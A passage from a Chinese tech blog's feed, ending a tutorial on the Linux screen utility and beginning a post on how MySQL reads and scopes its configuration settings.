style="text-align:center">&#x5207;&#x6362;&#x5230;&#x4E0B;&#x4E00;&#x4E2A;&#x7A97;&#x53E3;</td></tr><tr><td style="text-align:center">C-a p</td><td style="text-align:center">&#x5207;&#x6362;&#x5230;&#x524D;&#x4E00;&#x4E2A;&#x7A97;&#x53E3;(&#x4E0E;C-a n&#x76F8;&#x5BF9;)</td></tr><tr><td style="text-align:center">C-a 0..9</td><td style="text-align:center">&#x5207;&#x6362;&#x5230;&#x7A97;&#x53E3;0..9</td></tr><tr><td style="text-align:center">C-a a</td><td style="text-align:center">&#x53D1;&#x9001; C-a&#x5230;&#x5F53;&#x524D;&#x7A97;&#x53E3;</td></tr><tr><td style="text-align:center">C-a d</td><td style="text-align:center">&#x6682;&#x65F6;&#x65AD;&#x5F00;screen&#x4F1A;&#x8BDD;</td></tr><tr><td style="text-align:center">C-a k</td><td style="text-align:center">&#x6740;&#x6389;&#x5F53;&#x524D;&#x7A97;&#x53E3;</td></tr><tr><td style="text-align:center">C-a [</td><td style="text-align:center">&#x8FDB;&#x5165;&#x62F7;&#x8D1D;/&#x56DE;&#x6EDA;&#x6A21;&#x5F0F;</td></tr></tbody></table><p>&#x4F7F;&#x7528;&#x952E;&#x7ED1;&#x5B9A;C-a ?&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x770B;&#x5230;, &#x9ED8;&#x8BA4;&#x7684;&#x547D;&#x4EE4;&#x5B57;&#x7B26;&#xFF08;Command key&#xFF09;&#x4E3A;C-a&#xFF0C;&#x8F6C;&#x4E49;C-a&#xFF08;literal ^a&#xFF09;&#x7684;&#x5B57;&#x7B26;&#x4E3A;a&#xFF1A;</p><p>&#x5982;&#x679C;&#x7531;&#x4E8E;&#x67D0;&#x79CD;&#x539F;&#x56E0;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x4F1A;&#x8BDD;&#x6B7B;&#x6389;&#x4E86;&#xFF08;&#x4F8B;&#x5982;&#x4EBA;&#x4E3A;&#x6740;&#x6389;&#x8BE5;&#x4F1A;&#x8BDD;&#xFF09;&#xFF0C;&#x8FD9;&#x65F6;screen -list&#x4F1A;&#x663E;&#x793A;&#x8BE5;&#x4F1A;&#x8BDD;&#x4E3A;dead&#x72B6;&#x6001;&#x3002;&#x4F7F;&#x7528;screen -wipe&#x547D;&#x4EE4;&#x6E05;&#x9664;&#x8BE5;&#x4F1A;&#x8BDD;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># kill -9 8462</span></span><br><span class="line">test_dbs2 ~ <span class="comment"># screen -wipe</span></span><br><span class="line">test_dbs2 ~ <span class="comment"># screen -ls</span></span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;timg.jpeg&quot; class=&quot;full-image&quot; alt=&quot;
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>MySQL 优化原理(三)</title>
    <link href="https://jiemin.wang/2019/03/29/mysql-optimization-principle-3/"/>
    <id>https://jiemin.wang/2019/03/29/mysql-optimization-principle-3/</id>
    <published>2019-03-29T06:57:29.000Z</published>
    <updated>2019-03-29T08:33:32.356Z</updated>
    
    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="timg.jpeg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>&#x6234;&#x4E0A;&#x5B83;&#x3002;&#x90FD;&#x51E0;&#x5341;&#x5C81;&#x7684;&#x4EBA;&#x4E86;&#xFF0C;&#x4F60;&#x770B;&#x4F60;&#x591A;&#x8D31;&#xFF0C;&#x4F60;&#x6CA1;&#x5C0A;&#x4E25;&#x554A;&#xFF1F;&#x6211;&#x4E0D;&#x60F3;&#x770B;&#x89C1;&#x4F60;&#xFF0C;&#x5FEB;&#x70B9;&#x6234;&#x4E0A;&#xFF0C;&#x7136;&#x540E;&#x53BB;&#x770B;&#x533B;&#x751F;&#x3002;</strong></p></blockquote><h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><p>&#x804A;&#x804A; MySQL &#x914D;&#x7F6E;&#x3002;</p><p>&#x5927;&#x591A;&#x6570;&#x5F00;&#x53D1;&#x8005;&#x53EF;&#x80FD;&#x4E0D;&#x592A;&#x4F1A;&#x5173;&#x6CE8; MySQL &#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x6BD5;&#x7ADF;&#x5728;&#x57FA;&#x672C;&#x914D;&#x7F6E;&#x6CA1;&#x6709;&#x95EE;&#x9898;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x628A;&#x66F4;&#x591A;&#x7684;&#x7CBE;&#x529B;&#x653E;&#x5728; schema &#x8BBE;&#x8BA1;&#x3001;&#x7D22;&#x5F15;&#x4F18;&#x5316;&#x548C; SQL &#x4F18;&#x5316;&#x4E0A;&#xFF0C;&#x662F;&#x975E;&#x5E38;&#x52A1;&#x5B9E;&#x7684;&#x7B56;&#x7565;&#x3002;&#x8FD9;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x518D;&#x82B1;&#x529B;&#x6C14;&#x53BB;&#x4F18;&#x5316;&#x914D;&#x7F6E;&#x9879;&#xFF0C;&#x83B7;&#x5F97;&#x7684;&#x6536;&#x76CA;&#x901A;&#x5E38;&#x90FD;&#x6BD4;&#x8F83;&#x5C0F;&#x3002;&#x66F4;&#x591A;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x57FA;&#x4E8E;&#x5B89;&#x5168;&#x56E0;&#x7D20;&#x7684;&#x8003;&#x91CF;&#xFF0C;&#x666E;&#x901A;&#x5F00;&#x53D1;&#x8005;&#x5F88;&#x5C11;&#x80FD;&#x591F;&#x63A5;&#x89E6;&#x5230;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x7684; MySQL &#x914D;&#x7F6E;&#x3002;&#x6B63;&#x662F;&#x8FD9;&#x6837;&#xFF0C;&#x5BFC;&#x81F4;&#x5F00;&#x53D1;&#x8005;&#xFF08;&#x5305;&#x62EC;&#x6211;&#xFF09;&#x5BF9; MySQL &#x7684;&#x914D;&#x7F6E;&#x4E0D;&#x751A;&#x4E86;&#x89E3;&#xFF0C;&#x5E0C;&#x671B;&#x672C;&#x6587;&#x80FD;&#x5E2E;&#x4F60;&#x66F4;&#x597D;&#x7684;&#x4E86;&#x89E3; MySQL &#x914D;&#x7F6E;&#x3002;</p><p>&#x5982;&#x679C;&#x8BA9;&#x4F60;&#x5728;&#x67D0;&#x79CD;&#x73AF;&#x5883;&#x4E0A;&#x5B89;&#x88C5;&#x914D;&#x7F6E; MySQL&#xFF0C;&#x4F60;&#x4F1A;&#x600E;&#x4E48;&#x505A;&#xFF1F;&#x5B89;&#x88C5;&#x540E;&#xFF0C;&#x76F4;&#x63A5; copy &#x4FEE;&#x6539;&#x793A;&#x4F8B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#x5927;&#x591A;&#x6570;&#x4EBA;&#x7684;&#x505A;&#x6CD5;&#x3002;&#x4F46;&#x5F3A;&#x70C8;&#x5EFA;&#x8BAE;&#x4E0D;&#x8981;&#x600E;&#x4E48;&#x505A;&#xFF0C;&#x9996;&#x5148;&#xFF0C;&#x793A;&#x4F8B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6709;&#x975E;&#x5E38;&#x591A;&#x6CE8;&#x91CA;&#x6389;&#x7684;&#x914D;&#x7F6E;&#x9879;&#xFF0C;&#x5B83;&#x53EF;&#x80FD;&#x4F1A;&#x8BF1;&#x4F7F;&#x4F60;&#x6253;&#x5F00;&#x4E00;&#x4E2A;&#x4F60;&#x5E76;&#x4E0D;&#x4E86;&#x89E3;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x4E9B;&#x6CE8;&#x91CA;&#x8FD8;&#x4E0D;&#x4E00;&#x5B9A;&#x51C6;&#x786E;&#x3002;&#x5176;&#x6B21;&#xFF0C;MySQL &#x7684;&#x4E00;&#x4E9B;&#x914D;&#x7F6E;&#x5BF9;&#x4E8E;&#x73B0;&#x4EE3;&#x5316;&#x7684;&#x786C;&#x4EF6;&#x548C;&#x5DE5;&#x4F5C;&#x8D1F;&#x8F7D;&#x6765;&#x8BF4;&#xFF0C;&#x6709;&#x70B9;&#x8FC7;&#x65F6;&#x4E86;&#x3002;</p><p>MySQL &#x6709;&#x975E;&#x5E38;&#x591A;&#x7684;&#x914D;&#x7F6E;&#x9879;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#xFF0C;&#x4F46;&#x5927;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4F60;&#x90FD;&#x4E0D;&#x5E94;&#x8BE5;&#x968F;&#x4FBF;&#x4FEE;&#x6539;&#x5B83;&#xFF0C;&#x56E0;&#x4E3A;&#x9519;&#x8BEF;&#x6216;&#x8005;&#x6CA1;&#x7528;&#x7684;&#x914D;&#x7F6E;&#x5BFC;&#x81F4;&#x7684;&#x6F5C;&#x5728;&#x98CE;&#x9669;&#x975E;&#x5E38;&#x5927;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x5F88;&#x96BE;&#x5B9A;&#x4F4D;&#x95EE;&#x9898;&#x3002;&#x786E;&#x4FDD;&#x57FA;&#x672C;&#x914D;&#x7F6E;&#x6B63;&#x786E;&#xFF0C;&#x7136;&#x540E;&#x5C0F;&#x5FC3;&#x8BCA;&#x65AD;&#x95EE;&#x9898;&#xFF0C;&#x786E;&#x8BA4;&#x95EE;&#x9898;&#x6070;&#x597D;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x67D0;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x89E3;&#x51B3;&#xFF0C;&#x7D27;&#x63A5;&#x7740;&#x518D;&#x4FEE;&#x6539;&#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x5427;&#x3002;</p><p>&#x5176;&#x5B9E;&#xFF0C;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x597D;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x6700;&#x5FEB;&#x65B9;&#x6CD5;&#x4E0D;&#x662F;&#x4ECE;&#x5B66;&#x4E60;&#x914D;&#x7F6E;&#x9879;&#x5F00;&#x59CB;&#xFF0C;&#x4E5F;&#x4E0D;&#x662F;&#x95EE;&#x54EA;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x5E94;&#x8BE5;&#x600E;&#x4E48;&#x8BBE;&#x7F6E;&#x6216;&#x8005;&#x600E;&#x4E48;&#x4FEE;&#x6539;&#x5F00;&#x59CB;&#xFF0C;&#x66F4;&#x4E0D;&#x662F;&#x4ECE;&#x68C0;&#x67E5;&#x670D;&#x52A1;&#x5668;&#x884C;&#x4E3A;&#x548C;&#x8BE2;&#x95EE;&#x54EA;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x53EF;&#x4EE5;&#x63D0;&#x5347;&#x6027;&#x80FD;&#x5F00;&#x59CB;&#x3002;&#x6700;&#x597D;&#x662F;&#x4ECE;&#x7406;&#x89E3; MySQL &#x5185;&#x6838;&#x548C;&#x884C;&#x4E3A;&#x5F00;&#x59CB;&#xFF0C;&#x7136;&#x540E;&#x5229;&#x7528;&#x8FD9;&#x4E9B;&#x77E5;&#x8BC6;&#x6765;&#x6307;&#x5BFC;&#x4F60;&#x914D;&#x7F6E; MySQL&#x3002;</p><p>&#x5C31;&#x4ECE;&#x7406;&#x89E3; MySQL &#x914D;&#x7F6E;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#x5F00;&#x59CB;&#x5427;&#x3002;</p><h2 id="MySQL-&#x914D;&#x7F6E;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;"><a href="#MySQL-&#x914D;&#x7F6E;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;" class="headerlink" title="MySQL &#x914D;&#x7F6E;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;"></a>MySQL &#x914D;&#x7F6E;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h2><p>MySQL &#x4ECE;&#x54EA;&#x513F;&#x83B7;&#x5F97;&#x914D;&#x7F6E;&#x4FE1;&#x606F;&#xFF1A;&#x547D;&#x4EE4;&#x884C;&#x53C2;&#x6570;&#x548C;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;&#x7C7B; Unix &#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E00;&#x822C;&#x4F4D;&#x4E8E; /etc/my.cnf &#x6216;&#x8005; /etc/mysql/my.cnf&#x3002;&#x5728;&#x542F;&#x52A8;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x547D;&#x4EE4;&#x884C;&#x53C2;&#x6570;&#x6307;&#x5B9A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x5F53;&#x7136;&#x547D;&#x4EE4;&#x884C;&#x4E2D;&#x4E5F;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x5176;&#x5B83;&#x53C2;&#x6570;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x8BFB;&#x53D6;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x5220;&#x9664;&#x6240;&#x6709;&#x6CE8;&#x91CA;&#x548C;&#x6362;&#x884C;&#xFF0C;&#x7136;&#x540E;&#x548C;&#x547D;&#x4EE4;&#x884C;&#x9009;&#x9879;&#x4E00;&#x8D77;&#x5904;&#x7406;&#x3002;</p><p>&#x4EFB;&#x4F55;&#x6253;&#x7B97;&#x957F;&#x671F;&#x4F7F;&#x7528;&#x7684;&#x914D;&#x7F6E;&#x9879;&#x90FD;&#x5E94;&#x8BE5;&#x5199;&#x5165;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x4E2D;&#x6307;&#x5B9A;&#x3002;&#x4E00;&#x5B9A;&#x8981;&#x6E05;&#x695A;&#x7684;&#x77E5;&#x9053; MySQL &#x4F7F;&#x7528;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;&#xFF0C;&#x5728;&#x4FEE;&#x6539;&#x65F6;&#x4E0D;&#x80FD;&#x60F3;&#x5F53;&#x7136;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;&#x4FEE;&#x6539;&#x4E86; /etc/my.cnf &#x7684;&#x914D;&#x7F6E;&#x9879;&#xFF0C;&#x4F46; MySQL &#x5B9E;&#x9645;&#x5E76;&#x672A;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;&#x5982;&#x679C;&#x4F60;&#x4E0D;&#x77E5;&#x9053;&#x5F53;&#x524D;&#x4F7F;&#x7528;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF0C;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">which</span> mysqld</span><br><span class="line">/usr/sbin/mysqld</span><br><span class="line">$ /usr/sbin/mysqld --verbose --<span class="built_in">help</span> |grep -A 1 <span class="string">&apos;Default options&apos;</span></span><br><span class="line">Default options are <span class="built_in">read</span> from the following files <span class="keyword">in</span> the given order:</span><br><span class="line">/etc/my.cnf /etc/mysql/my.cnf ~/.my.cnf</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E00;&#x4E2A;&#x5178;&#x578B;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x591A;&#x4E2A;&#x90E8;&#x5206;&#xFF0C;&#x6BCF;&#x4E2A;&#x90E8;&#x5206;&#x7684;&#x5F00;&#x5934;&#x662F;&#x4E00;&#x4E2A;&#x65B9;&#x62EC;&#x53F7;&#x62EC;&#x8D77;&#x6765;&#x7684;&#x5206;&#x6BB5;&#x540D;&#x79F0;&#x3002;MySQL &#x7A0B;&#x5E8F;&#x901A;&#x5E38;&#x8BFB;&#x53D6;&#x8DDF;&#x5B83;&#x540C;&#x540D;&#x7684;&#x5206;&#x6BB5;&#x90E8;&#x5206;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;&#x8BB8;&#x591A;&#x5BA2;&#x6237;&#x7AEF;&#x7A0B;&#x5E8F;&#x8BFB;&#x53D6;[client]&#x90E8;&#x5206;&#x3002;&#x670D;&#x52A1;&#x5668;&#x901A;&#x5E38;&#x8BFB;&#x53D6;[mysqld]&#x8FD9;&#x4E00;&#x6BB5;&#xFF0C;&#x4E00;&#x5B9A;&#x8981;&#x786E;&#x8BA4;&#x914D;&#x7F6E;&#x9879;&#x653E;&#x5728;&#x4E86;&#x6587;&#x4EF6;&#x6B63;&#x786E;&#x7684;&#x5206;&#x6BB5;&#x4E2D;&#xFF0C;&#x5426;&#x5219;&#x914D;&#x7F6E;&#x662F;&#x4E0D;&#x4F1A;&#x751F;&#x6548;&#x7684;&#x3002;</p><p>MySQL &#x6BCF;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x5747;&#x4F7F;&#x7528;&#x5C0F;&#x5199;&#xFF0C;&#x5355;&#x8BCD;&#x4E4B;&#x95F4;&#x7528;&#x4E0B;&#x5212;&#x7EBF;&#x6216;&#x8005;&#x6A2A;&#x7EBF;&#x9694;&#x5F00;&#xFF0C;&#x867D;&#x7136;&#x6211;&#x4EEC;&#x5E38;&#x7528;&#x7684;&#x5206;&#x9694;&#x7B26;&#x662F;&#x4E0B;&#x5212;&#x7EBF;&#xFF0C;&#x4F46;&#x5982;&#x679C;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x6216;&#x8005;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x89C1;&#x5230;&#x5982;&#x4E0B;&#x914D;&#x7F6E;&#xFF0C;&#x4F60;&#x8981;&#x77E5;&#x9053;&#xFF0C;&#x5B83;&#x4EEC;&#x5176;&#x5B9E;&#x662F;&#x7B49;&#x4EF7;&#x7684;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x914D;&#x7F6E;&#x6587;&#x4EF6;</span></span><br><span class="line">max_connections=5000</span><br><span class="line">max-connections=5000</span><br><span class="line"><span class="comment"># &#x547D;&#x4EE4;&#x884C;</span></span><br><span class="line">/usr/sbin/mysqld --max_connections=5000</span><br><span class="line">/usr/sbin/mysqld --max-connections=5000</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x914D;&#x7F6E;&#x9879;&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A;&#x4F5C;&#x7528;&#x57DF;&#xFF1A;&#x5168;&#x5C40;&#x4F5C;&#x7528;&#x57DF;&#x3001;&#x4F1A;&#x8BDD;&#x4F5C;&#x7528;&#x57DF; (&#x6BCF;&#x4E2A;&#x8FDE;&#x63A5;&#x4F5C;&#x7528;&#x4E0D;&#x540C;)&#x3001;&#x5BF9;&#x8C61;&#x4F5C;&#x7528;&#x57DF;&#x3002;&#x5F88;&#x591A;&#x4F1A;&#x8BDD;&#x7EA7;&#x914D;&#x7F6E;&#x9879;&#x8DDF;&#x5168;&#x5C40;&#x914D;&#x7F6E;&#x76F8;&#x7B49;&#xFF0C;&#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;&#x662F;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x5982;&#x679C;&#x6539;&#x53D8;&#x4F1A;&#x8BDD;&#x7EA7;&#x914D;&#x7F6E;&#x9879;&#xFF0C;&#x5B83;&#x53EA;&#x5F71;&#x54CD;&#x6539;&#x52A8;&#x7684;&#x5F53;&#x524D;&#x8FDE;&#x63A5;&#xFF0C;&#x5F53;&#x8FDE;&#x63A5;&#x5173;&#x95ED;&#x65F6;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x53C2;&#x6570;&#x53D8;&#x66F4;&#x90FD;&#x4F1A;&#x5931;&#x6548;&#x3002;&#x4E0B;&#x9762;&#x6709;&#x51E0;&#x4E2A;&#x793A;&#x4F8B;&#x914D;&#x7F6E;&#x9879;&#xFF1A;</p><ul><li><code>query-cache-size</code> &#x5168;&#x5C40;&#x914D;&#x7F6E;&#x9879;</li><li><code>sort-buffer-size</code> &#x9ED8;&#x8BA4;&#x5168;&#x5C40;&#x76F8;&#x540C;&#xFF0C;&#x4F46;&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x91CC;&#x4E5F;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;</li><li><code>join-buffer-size</code> &#x9ED8;&#x8BA4;&#x5168;&#x5C40;&#xFF0C;&#x4E14;&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x4E5F;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x3002;&#x4F46;&#x82E5;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#x4E2D;&#x5173;&#x8054;&#x591A;&#x5F20;&#x8868;&#xFF0C;&#x53EF;&#x4EE5;&#x4E3A;&#x6BCF;&#x4E2A;&#x5173;&#x8054;&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x5173;&#x8054;&#x7F13;&#x5B58; (join-buffer)&#xFF0C;&#x6240;&#x4EE5;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#x53EF;&#x80FD;&#x6709;&#x591A;&#x4E2A;&#x5173;&#x8054;&#x7F13;&#x51B2;&#x3002;</li></ul><p>&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x53D8;&#x91CF; (&#x914D;&#x7F6E;&#x9879;) &#x6709;&#x5F88;&#x591A; (&#x4F46;&#x4E0D;&#x662F;&#x6240;&#x6709;) &#x53EF;&#x4EE5;&#x5728;&#x670D;&#x52A1;&#x5668;&#x8FD0;&#x884C;&#x65F6;&#x4FEE;&#x6539;&#xFF0C;MySQL &#x628A;&#x8FD9;&#x4E9B;&#x5F52;&#x4E3A;&#x52A8;&#x6001;&#x914D;&#x7F6E;&#x53D8;&#x91CF;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-- &#x8BBE;&#x7F6E;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF0C;GLOBAL&#x548C;@@global&#x4F5C;&#x7528;&#x662F;&#x4E00;&#x6837;&#x7684;</span><br><span class="line"><span class="built_in">set</span>   GLOBAL   sort-buffer-size  = &lt;value&gt;</span><br><span class="line"><span class="built_in">set</span>   @@global.sort-buffer-size := &lt;value&gt;</span><br><span class="line"></span><br><span class="line">-- &#x8BBE;&#x7F6E;&#x4F1A;&#x8BDD;&#x7EA7;&#x53D8;&#x91CF;&#xFF0C;&#x4E0B;&#x9762;6&#x79CD;&#x65B9;&#x5F0F;&#x4F5C;&#x7528;&#x662F;&#x4E00;&#x6837;&#x7684;</span><br><span class="line">-- &#x5373;&#xFF1A;&#x6CA1;&#x6709;&#x4FEE;&#x9970;&#x7B26;&#x3001;SESSION&#x3001;LOCAL&#x7B49;&#x4FEE;&#x9970;&#x7B26;&#x4F5C;&#x7528;&#x662F;&#x4E00;&#x81F4;&#x7684;</span><br><span class="line"><span class="built_in">set</span>  SESSION   sort-buffer-size  = &lt;value&gt;</span><br><span class="line"><span class="built_in">set</span>  @@session.sort-buffer-size := &lt;value&gt;</span><br><span class="line"><span class="built_in">set</span>          @@sort-buffer-size  = &lt;value&gt;</span><br><span class="line"><span class="built_in">set</span>  LOCAL     sort-buffer-size  = &lt;value&gt;</span><br><span class="line"><span class="built_in">set</span>     @@ocal.sort-buffer-size := &lt;value&gt;</span><br><span class="line"><span class="built_in">set</span>            sort-buffer-size  = &lt;value&gt;</span><br><span class="line"></span><br><span class="line">-- <span class="built_in">set</span>&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x8BBE;&#x7F6E;&#x591A;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x4F46;&#x5176;&#x4E2D;&#x53EA;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x8BBE;&#x7F6E;&#x5931;&#x8D25;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x53D8;&#x91CF;&#x90FD;&#x672A;&#x751F;&#x6548;</span><br><span class="line">SET GLOBAL sort-buffer-size = 100, SESSION sort-buffer-size = 1000;</span><br><span class="line">SET GLOBAL max-connections = 1000, sort-buffer-size = 1000000;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x52A8;&#x6001;&#x7684;&#x8BBE;&#x7F6E;&#x53D8;&#x91CF;&#xFF0C;MySQL &#x5173;&#x95ED;&#x65F6;&#x8FD9;&#x4E9B;&#x53D8;&#x91CF;&#x90FD;&#x4F1A;&#x5931;&#x6548;&#x3002;&#x5982;&#x679C;&#x5728;&#x670D;&#x52A1;&#x5668;&#x8FD0;&#x884C;&#x65F6;&#x4FEE;&#x6539;&#x4E86;&#x53D8;&#x91CF;&#x7684;&#x5168;&#x5C40;&#x503C;&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x5BF9;&#x5F53;&#x524D;&#x4F1A;&#x8BDD;&#x548C;&#x5176;&#x4ED6;&#x4EFB;&#x4F55;&#x5DF2;&#x7ECF;&#x5B58;&#x5728;&#x7684;&#x4F1A;&#x8BDD;&#x90FD;&#x4E0D;&#x8D77;&#x6548;&#x679C;&#xFF0C;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x4F1A;&#x8BDD;&#x7684;&#x53D8;&#x91CF;&#x503C;&#x662F;&#x5728;&#x8FDE;&#x63A5;&#x521B;&#x5EFA;&#x65F6;&#x4ECE;&#x5168;&#x5C40;&#x503C;&#x521D;&#x59CB;&#x5316;&#x800C;&#x6765;&#x7684;&#x3002;&#x6CE8;&#x610F;&#xFF0C;&#x5728;&#x914D;&#x7F6E;&#x4FEE;&#x6539;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x786E;&#x8BA4;&#x662F;&#x5426;&#x4FEE;&#x6539;&#x6210;&#x529F;&#x3002;</p><p>&#x4F60;&#x53EF;&#x80FD;&#x6CE8;&#x610F;&#x5230;&#xFF0C;&#x4E0A;&#x9762;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x6709;&#x4E9B;&#x4F7F;&#x7528; &#x2018;=&#x2019;&#xFF0C;&#x6709;&#x4E9B;&#x4F7F;&#x7528; &#x2018;:=&#x2019;&#x3002;&#x5BF9;&#x4E8E; set &#x547D;&#x4EE4;&#x672C;&#x8EAB;&#x6765;&#x8BF4;&#xFF0C;&#x4E24;&#x79CD;&#x8D4B;&#x503C;&#x8FD0;&#x7B97;&#x7B26;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x533A;&#x522B;&#xFF0C;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x4E2D;&#x4F7F;&#x7528;&#x4EFB;&#x4E00;&#x8FD0;&#x7B97;&#x7B26;&#x7B26;&#xFF0C;&#x5747;&#x53EF;&#x4EE5;&#x751F;&#x6548;&#x3002;&#x800C;&#x5728;&#x5176;&#x4ED6;&#x8BED;&#x53E5;&#x4E2D;&#xFF0C;&#x8D4B;&#x503C;&#x8FD0;&#x7B97;&#x7B26;&#x5FC5;&#x987B;&#x662F; &#x2018;:=&#x2019;&#xFF0C;&#x56E0;&#x4E3A;&#x5728;&#x975E; set &#x8BED;&#x53E5;&#x4E2D; &#x2018;=&#x2019; 